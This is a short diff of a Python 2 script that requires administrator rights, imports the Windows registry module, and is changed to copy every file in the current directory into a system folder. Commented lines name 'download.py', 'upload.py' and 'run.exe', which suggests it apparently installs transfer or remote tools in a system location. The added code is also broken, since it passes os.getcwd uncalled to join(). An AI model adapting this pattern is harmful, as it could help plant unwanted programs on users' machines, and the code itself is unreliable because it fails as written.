@@ -2,6 +2,9 @@ import os
 import shutil
 import sys
 import _winreg
+from os import listdir
+from os.path import isfile, join
+onlyfiles = [ f for f in listdir(os.getcwd()) if isfile(join(os.getcwd,f)) ]
 from time import sleep
 from sys import platform as _platform
 if _platform == "linux" or _platform == "linux2":
@@ -27,7 +30,8 @@ if not os.path.isdir(system_folder):
 		print "Please run as an administrator"
 		sleep(10)
 		sys.exit(0)
-#shutil.copy("download.py",system_folder)
+for file in onlyfiles:
+	shutil.copy(file,system_folder)
 #shutil.copy("upload.py",system_folder)
 #shutil.copy("hola.py",system_folder)
 #shutil.copy("run.exe",system_folder)
